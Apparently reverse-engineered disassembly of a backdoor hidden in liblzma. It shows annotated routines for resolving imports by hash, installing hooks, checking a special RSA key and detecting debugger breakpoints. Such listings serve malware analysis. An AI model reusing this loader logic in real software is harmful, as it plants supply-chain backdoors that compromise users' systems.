.text.lzma_lz_decoder_inia:00000000000051F4                 sub     rsp, 10h
.text.lzma_lz_decoder_inia:00000000000051F8                 call    _Llzma_index_iter_rewind_cold ; PIC mode
.text.lzma_lz_decoder_inia:00000000000051FD                 test    eax, eax
.text.lzma_lz_decoder_inia:00000000000051FF                 jz      loc_53EE
.text.lzma_lz_decoder_inia:0000000000005205                 mov     edi, 1          ; _QWORD
.text.lzma_lz_decoder_inia:000000000000520A                 call    get_lzma_allocator ; PIC mode
.text.lzma_lz_decoder_inia:000000000000520F                 xor     edx, edx        ; a3
.text.lzma_lz_decoder_inia:0000000000005211                 mov     esi, 6E0h       ; hash
.text.lzma_lz_decoder_inia:0000000000005216                 mov     r14, rax
.text.lzma_lz_decoder_inia:0000000000005219                 mov     rax, [r13+8]
.text.lzma_lz_decoder_inia:000000000000521D                 mov     rdi, [rax+20h]  ; a1
.text.lzma_lz_decoder_inia:0000000000005221                 mov     [r14+10h], rdi
.text.lzma_lz_decoder_inia:0000000000005225                 call    import_lookup_get_str ; PIC mode
.text.lzma_lz_decoder_inia:000000000000522A                 mov     rdx, [r13+8]
.text.lzma_lz_decoder_inia:000000000000522E                 mov     rcx, [rdx+18h]
.text.lzma_lz_decoder_inia:0000000000005232                 cmp     dword ptr [rcx+4Ch], 0
.text.lzma_lz_decoder_inia:0000000000005236                 jz      loc_53C4
.text.lzma_lz_decoder_inia:000000000000523C                 test    rax, rax
.text.lzma_lz_decoder_inia:000000000000523F                 jz      short loc_5256
.text.lzma_lz_decoder_inia:0000000000005241                 mov     rdx, [rdx+20h]
.text.lzma_lz_decoder_inia:0000000000005245                 mov     rax, [rax+8]
.text.lzma_lz_decoder_inia:0000000000005249                 add     rax, [rdx]
.text.lzma_lz_decoder_inia:000000000000524C                 inc     dword ptr [rbx+120h]
.text.lzma_lz_decoder_inia:0000000000005252                 mov     [rbx+40h], rax
.text.lzma_lz_decoder_inia:0000000000005256
.text.lzma_lz_decoder_inia:0000000000005256 loc_5256:                               ; CODE XREF: _Llzma_lz_decoder_init_0+6F↑j
.text.lzma_lz_decoder_inia:0000000000005256                 mov     rsi, r14
.text.lzma_lz_decoder_inia:0000000000005259                 mov     edi, 6F8h
.text.lzma_lz_decoder_inia:000000000000525E                 call    lzma_alloc      ; PIC mode
.text.lzma_lz_decoder_inia:0000000000005263                 mov     [rbx+98h], rax
.text.lzma_lz_decoder_inia:000000000000526A                 test    rax, rax
.text.lzma_lz_decoder_inia:000000000000526D                 jz      short loc_5275
.text.lzma_lz_decoder_inia:000000000000526F                 inc     dword ptr [rbx+120h]
.text.lzma_lz_decoder_inia:0000000000005275
.text.lzma_lz_decoder_inia:0000000000005275 loc_5275:                               ; CODE XREF: _Llzma_lz_decoder_init_0+9D↑j
.text.lzma_lz_decoder_inia:0000000000005275                 mov     rax, [r13+8]
.text.lzma_lz_decoder_inia:0000000000005279                 xor     edx, edx        ; a3
.text.lzma_lz_decoder_inia:000000000000527B                 mov     esi, 268h       ; hash
.text.lzma_lz_decoder_inia:0000000000005280                 mov     rdi, [rax+20h]  ; a1
.text.lzma_lz_decoder_inia:0000000000005284                 call    import_lookup_get_str ; PIC mode
.text.lzma_lz_decoder_inia:0000000000005289                 mov     rsi, r14
.text.lzma_lz_decoder_inia:000000000000528C                 mov     edi, 7E8h
.text.lzma_lz_decoder_inia:0000000000005291                 mov     [rsp+38h+var_30], rax
.text.lzma_lz_decoder_inia:0000000000005296                 call    lzma_alloc      ; PIC mode
.text.lzma_lz_decoder_inia:000000000000529B                 mov     rdx, [rsp+38h+var_30]
.text.lzma_lz_decoder_inia:00000000000052A0                 test    rax, rax
.text.lzma_lz_decoder_inia:00000000000052A3                 mov     [rbx+50h], rax
.text.lzma_lz_decoder_inia:00000000000052A7                 jz      short loc_52AF
.text.lzma_lz_decoder_inia:00000000000052A9                 inc     dword ptr [rbx+120h]
.text.lzma_lz_decoder_inia:00000000000052AF
.text.lzma_lz_decoder_inia:00000000000052AF loc_52AF:                               ; CODE XREF: _Llzma_lz_decoder_init_0+D7↑j
.text.lzma_lz_decoder_inia:00000000000052AF                 mov     rcx, [r13+8]
.text.lzma_lz_decoder_inia:00000000000052B3                 test    rdx, rdx
.text.lzma_lz_decoder_inia:00000000000052B6                 jz      short loc_52CD
.text.lzma_lz_decoder_inia:00000000000052B8                 mov     rsi, [rcx+20h]
.text.lzma_lz_decoder_inia:00000000000052BC                 mov     rax, [rdx+8]
.text.lzma_lz_decoder_inia:00000000000052C0                 add     rax, [rsi]
.text.lzma_lz_decoder_inia:00000000000052C3                 inc     dword ptr [rbx+120h]
.text.lzma_lz_decoder_inia:00000000000052C9                 mov     [rbx+48h], rax
.text.lzma_lz_decoder_inia:00000000000052CD
.text.lzma_lz_decoder_inia:00000000000052CD loc_52CD:                               ; CODE XREF: _Llzma_lz_decoder_init_0+E6↑j
.text.lzma_lz_decoder_inia:00000000000052CD                 mov     rdi, [rcx+8]    ; a1
.text.lzma_lz_decoder_inia:00000000000052D1                 xor     edx, edx        ; a3
.text.lzma_lz_decoder_inia:00000000000052D3                 mov     esi, 9C8h       ; hash
.text.lzma_lz_decoder_inia:00000000000052D8                 call    import_lookup_get_str ; PIC mode
.text.lzma_lz_decoder_inia:00000000000052DD                 test    rax, rax
.text.lzma_lz_decoder_inia:00000000000052E0                 jz      loc_53C4
.text.lzma_lz_decoder_inia:00000000000052E6                 mov     rdx, [r13+8]
.text.lzma_lz_decoder_inia:00000000000052EA                 mov     rsi, [rax+8]
.text.lzma_lz_decoder_inia:00000000000052EE                 mov     ecx, 4
.text.lzma_lz_decoder_inia:00000000000052F3                 mov     rdi, [rdx+8]
.text.lzma_lz_decoder_inia:00000000000052F7                 mov     rdx, [rax+10h]
.text.lzma_lz_decoder_inia:00000000000052FB                 add     rsi, [rdi]
.text.lzma_lz_decoder_inia:00000000000052FE                 mov     [r12+108h], rdx
.text.lzma_lz_decoder_inia:0000000000005306                 mov     [r12+100h], rsi
.text.lzma_lz_decoder_inia:000000000000530E                 call    process_elf_seg ; PIC mode
.text.lzma_lz_decoder_inia:0000000000005313                 test    eax, eax
.text.lzma_lz_decoder_inia:0000000000005315                 jz      loc_53C4
.text.lzma_lz_decoder_inia:000000000000531B                 mov     rcx, rbx
.text.lzma_lz_decoder_inia:000000000000531E                 mov     rdx, r12
.text.lzma_lz_decoder_inia:0000000000005321                 mov     rsi, r15
.text.lzma_lz_decoder_inia:0000000000005324                 mov     rdi, r13
.text.lzma_lz_decoder_inia:0000000000005327                 call    resolve_imports ; PIC mode
.text.lzma_lz_decoder_inia:000000000000532C                 test    eax, eax
.text.lzma_lz_decoder_inia:000000000000532E                 jz      loc_53C4
.text.lzma_lz_decoder_inia:0000000000005334                 mov     rsi, r14
.text.lzma_lz_decoder_inia:0000000000005337                 mov     edi, 0B28h
.text.lzma_lz_decoder_inia:000000000000533C                 call    lzma_alloc      ; PIC mode
.text.lzma_lz_decoder_inia:0000000000005341                 mov     [rbx+0C0h], rax
.text.lzma_lz_decoder_inia:0000000000005348                 test    rax, rax
.text.lzma_lz_decoder_inia:000000000000534B                 jz      short loc_5353
.text.lzma_lz_decoder_inia:000000000000534D                 inc     dword ptr [rbx+120h]
.text.lzma_lz_decoder_inia:0000000000005353
.text.lzma_lz_decoder_inia:0000000000005353 loc_5353:                               ; CODE XREF: _Llzma_lz_decoder_init_0+17B↑j
.text.lzma_lz_decoder_inia:0000000000005353                 mov     rax, [r13+8]
.text.lzma_lz_decoder_inia:0000000000005357                 mov     rcx, rbx
.text.lzma_lz_decoder_inia:000000000000535A                 mov     rdx, r12
.text.lzma_lz_decoder_inia:000000000000535D                 mov     rsi, [rax+20h]
.text.lzma_lz_decoder_inia:0000000000005361                 mov     rdi, [rax+8]
.text.lzma_lz_decoder_inia:0000000000005365                 call    _Llzma_filter_flags_decode_0 ; PIC mode
.text.lzma_lz_decoder_inia:000000000000536A                 test    eax, eax
.text.lzma_lz_decoder_inia:000000000000536C                 jz      short loc_53C4
.text.lzma_lz_decoder_inia:000000000000536E                 mov     rsi, [r15]
.text.lzma_lz_decoder_inia:0000000000005371                 mov     rcx, rbx
.text.lzma_lz_decoder_inia:0000000000005374                 mov     rdx, r12
.text.lzma_lz_decoder_inia:0000000000005377                 mov     rdi, r13
.text.lzma_lz_decoder_inia:000000000000537A                 call    _Llzma_index_hash_init_part_0 ; PIC mode
.text.lzma_lz_decoder_inia:000000000000537F                 test    eax, eax
.text.lzma_lz_decoder_inia:0000000000005381                 jz      short loc_53C4
.text.lzma_lz_decoder_inia:0000000000005383                 xor     eax, eax
.text.lzma_lz_decoder_inia:0000000000005385                 mov     ecx, 10h
.text.lzma_lz_decoder_inia:000000000000538A                 mov     rdi, r12
.text.lzma_lz_decoder_inia:000000000000538D                 rep stosd
.text.lzma_lz_decoder_inia:000000000000538F                 mov     rdx, [r12+0F8h]
.text.lzma_lz_decoder_inia:0000000000005397                 mov     eax, [rdx+8]
.text.lzma_lz_decoder_inia:000000000000539A                 cmp     eax, 8
.text.lzma_lz_decoder_inia:000000000000539D                 ja      short loc_53C4
.text.lzma_lz_decoder_inia:000000000000539F                 test    eax, eax
.text.lzma_lz_decoder_inia:00000000000053A1                 jnz     short loc_53AA
.text.lzma_lz_decoder_inia:00000000000053A3
.text.lzma_lz_decoder_inia:00000000000053A3 loc_53A3:                               ; CODE XREF: _Llzma_lz_decoder_init_0+1F2↓j
.text.lzma_lz_decoder_inia:00000000000053A3                 mov     eax, 1
.text.lzma_lz_decoder_inia:00000000000053A8                 jmp     short loc_53F0
.text.lzma_lz_decoder_inia:00000000000053AA ; ---------------------------------------------------------------------------
.text.lzma_lz_decoder_inia:00000000000053AA
.text.lzma_lz_decoder_inia:00000000000053AA loc_53AA:                               ; CODE XREF: _Llzma_lz_decoder_init_0+1D1↑j
.text.lzma_lz_decoder_inia:00000000000053AA                 mov     rsi, [rdx]
.text.lzma_lz_decoder_inia:00000000000053AD                 shl     rax, 3
.text.lzma_lz_decoder_inia:00000000000053B1                 xor     edx, edx
.text.lzma_lz_decoder_inia:00000000000053B3
.text.lzma_lz_decoder_inia:00000000000053B3 loc_53B3:                               ; CODE XREF: _Llzma_lz_decoder_init_0+1F0↓j
.text.lzma_lz_decoder_inia:00000000000053B3                 mov     cl, [rsi+rdx]
.text.lzma_lz_decoder_inia:00000000000053B6                 mov     [r12+rdx], cl
.text.lzma_lz_decoder_inia:00000000000053BA                 inc     rdx
.text.lzma_lz_decoder_inia:00000000000053BD                 cmp     rax, rdx
.text.lzma_lz_decoder_inia:00000000000053C0                 jnz     short loc_53B3
.text.lzma_lz_decoder_inia:00000000000053C2                 jmp     short loc_53A3
.text.lzma_lz_decoder_inia:00000000000053C4 ; ---------------------------------------------------------------------------
.text.lzma_lz_decoder_inia:00000000000053C4
.text.lzma_lz_decoder_inia:00000000000053C4 loc_53C4:                               ; CODE XREF: _Llzma_lz_decoder_init_0+66↑j
.text.lzma_lz_decoder_inia:00000000000053C4                                         ; _Llzma_lz_decoder_init_0+110↑j ...
.text.lzma_lz_decoder_inia:00000000000053C4                 mov     rdi, [rbx+98h]
.text.lzma_lz_decoder_inia:00000000000053CB                 mov     rsi, r14
.text.lzma_lz_decoder_inia:00000000000053CE                 call    lzma_free       ; PIC mode
.text.lzma_lz_decoder_inia:00000000000053D3                 mov     rdi, [rbx+50h]
.text.lzma_lz_decoder_inia:00000000000053D7                 mov     rsi, r14
.text.lzma_lz_decoder_inia:00000000000053DA                 call    lzma_free       ; PIC mode
.text.lzma_lz_decoder_inia:00000000000053DF                 mov     rdi, [rbx+0C0h]
.text.lzma_lz_decoder_inia:00000000000053E6                 mov     rsi, r14
.text.lzma_lz_decoder_inia:00000000000053E9                 call    lzma_free       ; PIC mode
.text.lzma_lz_decoder_inia:00000000000053EE
.text.lzma_lz_decoder_inia:00000000000053EE loc_53EE:                               ; CODE XREF: _Llzma_lz_decoder_init_0+2F↑j
.text.lzma_lz_decoder_inia:00000000000053EE                 xor     eax, eax
.text.lzma_lz_decoder_inia:00000000000053F0
.text.lzma_lz_decoder_inia:00000000000053F0 loc_53F0:                               ; CODE XREF: _Llzma_lz_decoder_init_0+1D8↑j
.text.lzma_lz_decoder_inia:00000000000053F0                 add     rsp, 10h
.text.lzma_lz_decoder_inia:00000000000053F4                 pop     rbx
.text.lzma_lz_decoder_inia:00000000000053F5                 pop     r12
.text.lzma_lz_decoder_inia:00000000000053F7                 pop     r13
.text.lzma_lz_decoder_inia:00000000000053F9                 pop     r14
.text.lzma_lz_decoder_inia:00000000000053FB                 pop     r15
.text.lzma_lz_decoder_inia:00000000000053FD                 retn
.text.lzma_lz_decoder_inia:00000000000053FD _Llzma_lz_decoder_init_0 endp
.text.lzma_lz_decoder_inia:00000000000053FD
.text.lzma_lz_decoder_inia:00000000000053FD _text_lzma_lz_decoder_inia ends
.text.lzma_lz_decoder_inia:00000000000053FD
.text.lzma_lzma_optimum_fasa:0000000000005400 ; ===========================================================================
.text.lzma_lzma_optimum_fasa:0000000000005400
.text.lzma_lzma_optimum_fasa:0000000000005400 ; Segment type: Pure code
.text.lzma_lzma_optimum_fasa:0000000000005400 ; Segment permissions: Read/Execute
.text.lzma_lzma_optimum_fasa:0000000000005400 _text_lzma_lzma_optimum_fasa segment para public 'CODE' use64
.text.lzma_lzma_optimum_fasa:0000000000005400                 assume cs:_text_lzma_lzma_optimum_fasa
.text.lzma_lzma_optimum_fasa:0000000000005400                 ;org 5400h
.text.lzma_lzma_optimum_fasa:0000000000005400                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_lzma_optimum_fasa:0000000000005400
.text.lzma_lzma_optimum_fasa:0000000000005400 ; =============== S U B R O U T I N E =======================================
.text.lzma_lzma_optimum_fasa:0000000000005400
.text.lzma_lzma_optimum_fasa:0000000000005400
.text.lzma_lzma_optimum_fasa:0000000000005400 ; __int64 __fastcall install_entries(__int64 *, struct_elf_info *, __int64, __int64, __int64)
.text.lzma_lzma_optimum_fasa:0000000000005400                 public install_entries
.text.lzma_lzma_optimum_fasa:0000000000005400 install_entries proc near               ; CODE XREF: parse_elf_init+7E2↓p
.text.lzma_lzma_optimum_fasa:0000000000005400
.text.lzma_lzma_optimum_fasa:0000000000005400 var_E8          = qword ptr -0E8h
.text.lzma_lzma_optimum_fasa:0000000000005400 var_E0          = qword ptr -0E0h
.text.lzma_lzma_optimum_fasa:0000000000005400 var_D8          = qword ptr -0D8h
.text.lzma_lzma_optimum_fasa:0000000000005400 var_D0          = qword ptr -0D0h
.text.lzma_lzma_optimum_fasa:0000000000005400 var_C8          = qword ptr -0C8h
.text.lzma_lzma_optimum_fasa:0000000000005400 var_C0          = qword ptr -0C0h
.text.lzma_lzma_optimum_fasa:0000000000005400 var_B8          = qword ptr -0B8h
.text.lzma_lzma_optimum_fasa:0000000000005400 var_B0          = qword ptr -0B0h
.text.lzma_lzma_optimum_fasa:0000000000005400 var_A8          = qword ptr -0A8h
.text.lzma_lzma_optimum_fasa:0000000000005400 var_A0          = qword ptr -0A0h
.text.lzma_lzma_optimum_fasa:0000000000005400 var_98          = qword ptr -98h
.text.lzma_lzma_optimum_fasa:0000000000005400 var_90          = qword ptr -90h
.text.lzma_lzma_optimum_fasa:0000000000005400 var_88          = qword ptr -88h
.text.lzma_lzma_optimum_fasa:0000000000005400 var_80          = qword ptr -80h
.text.lzma_lzma_optimum_fasa:0000000000005400 var_78          = qword ptr -78h
.text.lzma_lzma_optimum_fasa:0000000000005400 var_70          = qword ptr -70h
.text.lzma_lzma_optimum_fasa:0000000000005400 var_68          = qword ptr -68h
.text.lzma_lzma_optimum_fasa:0000000000005400 var_60          = qword ptr -60h
.text.lzma_lzma_optimum_fasa:0000000000005400 var_58          = qword ptr -58h
.text.lzma_lzma_optimum_fasa:0000000000005400 var_50          = qword ptr -50h
.text.lzma_lzma_optimum_fasa:0000000000005400 var_48          = qword ptr -48h
.text.lzma_lzma_optimum_fasa:0000000000005400 var_40          = qword ptr -40h
.text.lzma_lzma_optimum_fasa:0000000000005400 var_38          = qword ptr -38h
.text.lzma_lzma_optimum_fasa:0000000000005400 var_30          = qword ptr -30h
.text.lzma_lzma_optimum_fasa:0000000000005400
.text.lzma_lzma_optimum_fasa:0000000000005400                 endbr64
.text.lzma_lzma_optimum_fasa:0000000000005404                 push    r15
.text.lzma_lzma_optimum_fasa:0000000000005406                 push    r14
.text.lzma_lzma_optimum_fasa:0000000000005408                 push    r13
.text.lzma_lzma_optimum_fasa:000000000000540A                 mov     r13, rsi
.text.lzma_lzma_optimum_fasa:000000000000540D                 mov     esi, 1C8h
.text.lzma_lzma_optimum_fasa:0000000000005412                 push    r12
.text.lzma_lzma_optimum_fasa:0000000000005414                 mov     r12, r8
.text.lzma_lzma_optimum_fasa:0000000000005417                 push    rbx
.text.lzma_lzma_optimum_fasa:0000000000005418                 mov     rbx, rcx
.text.lzma_lzma_optimum_fasa:000000000000541B                 mov     ecx, 1Dh
.text.lzma_lzma_optimum_fasa:0000000000005420                 sub     rsp, 0C0h
.text.lzma_lzma_optimum_fasa:0000000000005427                 mov     [rsp+0E8h+var_E8], rdi
.text.lzma_lzma_optimum_fasa:000000000000542B                 xor     edi, edi
.text.lzma_lzma_optimum_fasa:000000000000542D                 mov     [rsp+0E8h+var_D8], rdx
.text.lzma_lzma_optimum_fasa:0000000000005432                 xor     edx, edx
.text.lzma_lzma_optimum_fasa:0000000000005434                 call    apply_one_entry_ex ; PIC mode
.text.lzma_lzma_optimum_fasa:0000000000005439                 test    eax, eax
.text.lzma_lzma_optimum_fasa:000000000000543B                 jz      loc_57ED
.text.lzma_lzma_optimum_fasa:0000000000005441                 mov     rax, offset installed_func_0
.text.lzma_lzma_optimum_fasa:0000000000005448                 lea     r14, [rsp+0E8h+var_88]
.text.lzma_lzma_optimum_fasa:000000000000544D                 mov     esi, 4
.text.lzma_lzma_optimum_fasa:0000000000005452                 mov     rdx, offset check_special_rsa_key
.text.lzma_lzma_optimum_fasa:0000000000005459                 mov     rcx, 1B000001C8h
.text.lzma_lzma_optimum_fasa:0000000000005463                 mov     rdi, r14
.text.lzma_lzma_optimum_fasa:0000000000005466                 mov     [rsp+0E8h+var_88], rax
.text.lzma_lzma_optimum_fasa:000000000000546B                 mov     rax, 1C000001C8h
.text.lzma_lzma_optimum_fasa:0000000000005475                 mov     [rsp+0E8h+var_80], rax
.text.lzma_lzma_optimum_fasa:000000000000547A                 mov     eax, 1
.text.lzma_lzma_optimum_fasa:000000000000547F                 shl     rax, 20h
.text.lzma_lzma_optimum_fasa:0000000000005483                 mov     [rsp+0E8h+var_70], rdx
.text.lzma_lzma_optimum_fasa:0000000000005488                 mov     rdx, offset installed_func_2
.text.lzma_lzma_optimum_fasa:000000000000548F                 mov     [rsp+0E8h+var_78], rax
.text.lzma_lzma_optimum_fasa:0000000000005494                 mov     [rsp+0E8h+var_60], rax
.text.lzma_lzma_optimum_fasa:000000000000549C                 mov     [rsp+0E8h+var_48], rax
.text.lzma_lzma_optimum_fasa:00000000000054A4                 mov     rax, offset installed_func_3
.text.lzma_lzma_optimum_fasa:00000000000054AB                 mov     [rsp+0E8h+var_58], rdx
.text.lzma_lzma_optimum_fasa:00000000000054B3                 mov     rdx, offset apply_one_entry
.text.lzma_lzma_optimum_fasa:00000000000054BA                 mov     [rsp+0E8h+var_40], rax
.text.lzma_lzma_optimum_fasa:00000000000054C2                 mov     rax, 19000001C4h
.text.lzma_lzma_optimum_fasa:00000000000054CC                 mov     [rsp+0E8h+var_38], rax
.text.lzma_lzma_optimum_fasa:00000000000054D4                 mov     eax, 40000001h
.text.lzma_lzma_optimum_fasa:00000000000054D9                 shl     rax, 2
.text.lzma_lzma_optimum_fasa:00000000000054DD                 mov     [rsp+0E8h+var_68], rcx
.text.lzma_lzma_optimum_fasa:00000000000054E5                 mov     rcx, 1A000001C8h
.text.lzma_lzma_optimum_fasa:00000000000054EF                 mov     [rsp+0E8h+var_50], rcx
.text.lzma_lzma_optimum_fasa:00000000000054F7                 mov     [rsp+0E8h+var_30], rax
.text.lzma_lzma_optimum_fasa:00000000000054FF                 call    apply_entries   ; PIC mode
.text.lzma_lzma_optimum_fasa:0000000000005504                 test    eax, eax
.text.lzma_lzma_optimum_fasa:0000000000005506                 jz      loc_57ED
.text.lzma_lzma_optimum_fasa:000000000000550C                 xor     eax, eax
.text.lzma_lzma_optimum_fasa:000000000000550E                 mov     ecx, 18h
.text.lzma_lzma_optimum_fasa:0000000000005513                 mov     rdi, r14
.text.lzma_lzma_optimum_fasa:0000000000005516                 xor     esi, esi
.text.lzma_lzma_optimum_fasa:0000000000005518                 rep stosd
.text.lzma_lzma_optimum_fasa:000000000000551A                 mov     edi, 1          ; _QWORD
.text.lzma_lzma_optimum_fasa:000000000000551F                 mov     [rsp+0E8h+var_B8], rsi
.text.lzma_lzma_optimum_fasa:0000000000005524                 mov     [rsp+0E8h+var_B0], rsi
.text.lzma_lzma_optimum_fasa:0000000000005529                 mov     [rsp+0E8h+var_A8], rsi
.text.lzma_lzma_optimum_fasa:000000000000552E                 mov     [rsp+0E8h+var_A0], rsi
.text.lzma_lzma_optimum_fasa:0000000000005533                 mov     [rsp+0E8h+var_98], rsi
.text.lzma_lzma_optimum_fasa:0000000000005538                 mov     [rsp+0E8h+var_90], rsi
.text.lzma_lzma_optimum_fasa:000000000000553D                 call    get_lzma_allocator ; PIC mode
.text.lzma_lzma_optimum_fasa:0000000000005542                 mov     edi, 118h
.text.lzma_lzma_optimum_fasa:0000000000005547                 mov     [rax+10h], r13
.text.lzma_lzma_optimum_fasa:000000000000554B                 mov     rsi, rax
.text.lzma_lzma_optimum_fasa:000000000000554E                 mov     [rsp+0E8h+var_E0], rax
.text.lzma_lzma_optimum_fasa:0000000000005553                 call    lzma_alloc      ; PIC mode
.text.lzma_lzma_optimum_fasa:0000000000005558                 mov     [rbx+80h], rax
.text.lzma_lzma_optimum_fasa:000000000000555F                 test    rax, rax
.text.lzma_lzma_optimum_fasa:0000000000005562                 jz      short loc_556A
.text.lzma_lzma_optimum_fasa:0000000000005564                 inc     dword ptr [rbx+120h]
.text.lzma_lzma_optimum_fasa:000000000000556A
.text.lzma_lzma_optimum_fasa:000000000000556A loc_556A:                               ; CODE XREF: install_entries+162↑j
.text.lzma_lzma_optimum_fasa:000000000000556A                 mov     rdi, [rsp+0E8h+var_E8]
.text.lzma_lzma_optimum_fasa:000000000000556E                 lea     rsi, [rsp+0E8h+var_B8]
.text.lzma_lzma_optimum_fasa:0000000000005573                 call    _Llzma_check_update_0 ; PIC mode
.text.lzma_lzma_optimum_fasa:0000000000005578                 mov     [rsp+0E8h+var_D0], rax
.text.lzma_lzma_optimum_fasa:000000000000557D                 test    rax, rax
.text.lzma_lzma_optimum_fasa:0000000000005580                 jz      loc_57ED
.text.lzma_lzma_optimum_fasa:0000000000005586                 mov     rax, [rsp+0E8h+var_B8]
.text.lzma_lzma_optimum_fasa:000000000000558B                 xor     edx, edx        ; a3
.text.lzma_lzma_optimum_fasa:000000000000558D                 mov     esi, 408h       ; hash
.text.lzma_lzma_optimum_fasa:0000000000005592                 mov     rdi, r13        ; a1
.text.lzma_lzma_optimum_fasa:0000000000005595                 mov     [rsp+0E8h+var_C8], rax
.text.lzma_lzma_optimum_fasa:000000000000559A                 call    import_lookup_get_str ; PIC mode
.text.lzma_lzma_optimum_fasa:000000000000559F                 xor     edx, edx        ; a3
.text.lzma_lzma_optimum_fasa:00000000000055A1                 mov     esi, 188h       ; hash
.text.lzma_lzma_optimum_fasa:00000000000055A6                 mov     rdi, r13        ; a1
.text.lzma_lzma_optimum_fasa:00000000000055A9                 mov     r15, rax
.text.lzma_lzma_optimum_fasa:00000000000055AC                 call    import_lookup_get_str ; PIC mode
.text.lzma_lzma_optimum_fasa:00000000000055B1                 test    rax, rax
.text.lzma_lzma_optimum_fasa:00000000000055B4                 jz      loc_57ED
.text.lzma_lzma_optimum_fasa:00000000000055BA                 mov     rdi, [rsp+0E8h+var_E8]
.text.lzma_lzma_optimum_fasa:00000000000055BE                 lea     rsi, [rsp+0E8h+var_B0]
.text.lzma_lzma_optimum_fasa:00000000000055C3                 xor     edx, edx
.text.lzma_lzma_optimum_fasa:00000000000055C5                 call    maybe_find_freespaces ; PIC mode
.text.lzma_lzma_optimum_fasa:00000000000055CA                 mov     r14, rax
.text.lzma_lzma_optimum_fasa:00000000000055CD                 test    rax, rax
.text.lzma_lzma_optimum_fasa:00000000000055D0                 jz      loc_57ED
.text.lzma_lzma_optimum_fasa:00000000000055D6                 mov     rax, [rsp+0E8h+var_B0]
.text.lzma_lzma_optimum_fasa:00000000000055DB                 mov     [rsp+0E8h+var_C0], rax
.text.lzma_lzma_optimum_fasa:00000000000055E0                 test    r15, r15
.text.lzma_lzma_optimum_fasa:00000000000055E3                 jz      short loc_55FA
.text.lzma_lzma_optimum_fasa:00000000000055E5                 mov     rax, [r15+8]
.text.lzma_lzma_optimum_fasa:00000000000055E9                 add     rax, [r13+0]
.text.lzma_lzma_optimum_fasa:00000000000055ED                 inc     dword ptr [rbx+120h]
.text.lzma_lzma_optimum_fasa:00000000000055F3                 mov     [rbx+88h], rax
.text.lzma_lzma_optimum_fasa:00000000000055FA
.text.lzma_lzma_optimum_fasa:00000000000055FA loc_55FA:                               ; CODE XREF: install_entries+1E3↑j
.text.lzma_lzma_optimum_fasa:00000000000055FA                 mov     rsi, [rsp+0E8h+var_E0]
.text.lzma_lzma_optimum_fasa:00000000000055FF                 mov     edi, 838h
.text.lzma_lzma_optimum_fasa:0000000000005604                 call    lzma_alloc      ; PIC mode
.text.lzma_lzma_optimum_fasa:0000000000005609                 mov     [rbx+0A0h], rax
.text.lzma_lzma_optimum_fasa:0000000000005610                 test    rax, rax
.text.lzma_lzma_optimum_fasa:0000000000005613                 jz      short loc_561B
.text.lzma_lzma_optimum_fasa:0000000000005615                 inc     dword ptr [rbx+120h]
.text.lzma_lzma_optimum_fasa:000000000000561B
.text.lzma_lzma_optimum_fasa:000000000000561B loc_561B:                               ; CODE XREF: install_entries+213↑j
.text.lzma_lzma_optimum_fasa:000000000000561B                 mov     rsi, [rsp+0E8h+var_E8]
.text.lzma_lzma_optimum_fasa:000000000000561F                 lea     rdi, [rsp+0E8h+var_A8]
.text.lzma_lzma_optimum_fasa:0000000000005624                 mov     rcx, rbx
.text.lzma_lzma_optimum_fasa:0000000000005627                 mov     rdx, r13
.text.lzma_lzma_optimum_fasa:000000000000562A                 call    sub_2540
.text.lzma_lzma_optimum_fasa:000000000000562F                 test    eax, eax
.text.lzma_lzma_optimum_fasa:0000000000005631                 jz      loc_57ED
.text.lzma_lzma_optimum_fasa:0000000000005637                 mov     r13, [rsp+0E8h+var_A8]
.text.lzma_lzma_optimum_fasa:000000000000563C                 mov     r8, [rsp+0E8h+var_D0]
.text.lzma_lzma_optimum_fasa:0000000000005641                 mov     edx, 0E230h
.text.lzma_lzma_optimum_fasa:0000000000005646                 mov     rax, [rsp+0E8h+var_C8]
.text.lzma_lzma_optimum_fasa:000000000000564B                 mov     [r12+78h], r13
.text.lzma_lzma_optimum_fasa:0000000000005650                 lea     rsi, [r13+4]
.text.lzma_lzma_optimum_fasa:0000000000005654                 mov     rdi, r13
.text.lzma_lzma_optimum_fasa:0000000000005657                 add     r8, rax
.text.lzma_lzma_optimum_fasa:000000000000565A                 mov     [rsp+0E8h+var_D0], r8
.text.lzma_lzma_optimum_fasa:000000000000565F                 call    check_software_breakpoint ; PIC mode
.text.lzma_lzma_optimum_fasa:0000000000005664                 mov     r8, [rsp+0E8h+var_D0]
.text.lzma_lzma_optimum_fasa:0000000000005669                 test    eax, eax
.text.lzma_lzma_optimum_fasa:000000000000566B                 setnz   al
.text.lzma_lzma_optimum_fasa:000000000000566E                 movzx   eax, al
.text.lzma_lzma_optimum_fasa:0000000000005671                 mov     [r12], eax
.text.lzma_lzma_optimum_fasa:0000000000005675                 jz      short loc_5698
.text.lzma_lzma_optimum_fasa:0000000000005677                 xor     esi, esi
.text.lzma_lzma_optimum_fasa:0000000000005679                 lea     rdx, [rsp+0E8h+var_A0]
.text.lzma_lzma_optimum_fasa:000000000000567E                 mov     r9d, 1
.text.lzma_lzma_optimum_fasa:0000000000005684                 mov     rcx, r13
.text.lzma_lzma_optimum_fasa:0000000000005687                 mov     rdi, r13
.text.lzma_lzma_optimum_fasa:000000000000568A                 call    apply_method_1  ; PIC mode
.text.lzma_lzma_optimum_fasa:000000000000568F                 test    eax, eax
.text.lzma_lzma_optimum_fasa:0000000000005691                 jnz     short loc_569D
.text.lzma_lzma_optimum_fasa:0000000000005693                 jmp     loc_57ED
.text.lzma_lzma_optimum_fasa:0000000000005698 ; ---------------------------------------------------------------------------
.text.lzma_lzma_optimum_fasa:0000000000005698
.text.lzma_lzma_optimum_fasa:0000000000005698 loc_5698:                               ; CODE XREF: install_entries+275↑j
.text.lzma_lzma_optimum_fasa:0000000000005698                 mov     [rsp+0E8h+var_A0], r8
.text.lzma_lzma_optimum_fasa:000000000000569D
.text.lzma_lzma_optimum_fasa:000000000000569D loc_569D:                               ; CODE XREF: install_entries+291↑j
.text.lzma_lzma_optimum_fasa:000000000000569D                 mov     rsi, [rsp+0E8h+var_C0]
.text.lzma_lzma_optimum_fasa:00000000000056A2                 push    r12
.text.lzma_lzma_optimum_fasa:00000000000056A4                 mov     rdi, r14
.text.lzma_lzma_optimum_fasa:00000000000056A7                 mov     rdx, r13
.text.lzma_lzma_optimum_fasa:00000000000056AA                 push    [rsp+0F0h+var_E8]
.text.lzma_lzma_optimum_fasa:00000000000056AE                 mov     r8, [rsp+0F8h+var_D8]
